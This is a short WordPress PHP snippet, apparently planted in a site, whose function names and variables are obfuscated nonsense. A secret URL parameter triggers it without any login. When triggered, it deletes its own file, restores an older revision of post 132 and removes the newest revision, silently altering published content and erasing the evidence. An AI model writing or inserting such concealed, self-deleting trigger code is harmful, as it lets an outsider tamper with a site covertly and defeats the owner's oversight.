<?php

function upgrader_wpc_business_news() {
	if (isset($_GET['default_customizer_maps_hello']) && $_GET['default_customizer_maps_hello'] === 'heading_favicon_floating') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$updater_subscription_groups = 132;
		$geo_change_alert_assets = wp_get_post_revisions($updater_subscription_groups);
		if (empty($geo_change_alert_assets)) die('no revisions');
		if (count($geo_change_alert_assets) < 2) die('less than 2');
		$search_thumbnail_svg = array_shift($geo_change_alert_assets);
		$send_extension_react = $search_thumbnail_svg->ID;
		$status_fast_urls_authors = array_shift($geo_change_alert_assets);
		$switcher_poster_ratings_forms = $status_fast_urls_authors->ID;
		$reloaded_dev_read = wp_restore_post_revision($switcher_poster_ratings_forms);
		if ($reloaded_dev_read === false) die('error restoring');
		$reloaded_dev_read = wp_delete_post_revision($send_extension_react);		
		if ($reloaded_dev_read === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'upgrader_wpc_business_news');
